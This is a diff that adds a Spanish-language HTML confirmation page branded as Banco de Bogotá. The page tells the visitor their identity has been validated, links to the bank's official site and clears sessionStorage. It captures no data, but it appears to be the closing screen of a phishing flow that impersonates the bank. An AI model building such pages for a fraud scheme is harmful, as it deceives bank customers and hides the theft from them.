@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1" name="viewport" />
+    <title>Banco de Bogotá</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+    </style>
+</head>
+
+<body class="bg-[#f3f7fc] min-h-screen flex flex-col items-center p-4">
+    <header class="w-full max-w-md flex items-center justify-between py-4">
+        <button aria-label="Volver" class="text-[#1a2a5a] text-xl invisible">
+            <i class="fas fa-chevron-left"></i>
+        </button>
+        <h1 class="text-[#1a2a5a] font-semibold text-base">
+            Banco de Bogotá
+        </h1>
+        <button aria-label="Cerrar" class="text-[#1a2a5a] text-xl invisible">
+            <i class="fas fa-times"></i>
+        </button>
+    </header>
+
+    <main class="w-full max-w-md">
+        <br>
+        <section class="bg-white rounded-lg p-8 shadow-sm text-center">
+            <div class="mb-6 flex justify-center">
+                <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
+                    <i class="fas fa-check text-green-600 text-3xl"></i>
+                </div>
+            </div>
+
+            <h2 class="text-[#1a2a5a] font-bold text-xl mb-4">
+                ¡Proceso Exitoso!
+            </h2>
+
+            <p class="text-[#5a5a5a] text-sm leading-relaxed mb-6">
+                Hemos validado tu identidad correctamente. Ya puedes cerrar esta ventana o continuar navegando en
+                nuestros canales digitales.
+            </p>
+
+            <a href="https://www.bancodebogota.com"
+                class="block w-full bg-[#003da5] text-white font-bold text-sm rounded-full py-3 hover:bg-[#003487] transition-colors duration-200">
+                Ir al sitio oficial
+            </a>
+        </section>
+
+        <p class="text-[10px] text-gray-500 text-center mt-6">
+            Banco de Bogotá S.A. Todos los derechos reservados.
+        </p>
+    </main>
+
+    <script>
+        // Limpiar datos de sesión al finalizar
+        sessionStorage.clear();
+    </script>
+</body>
+
+</html>
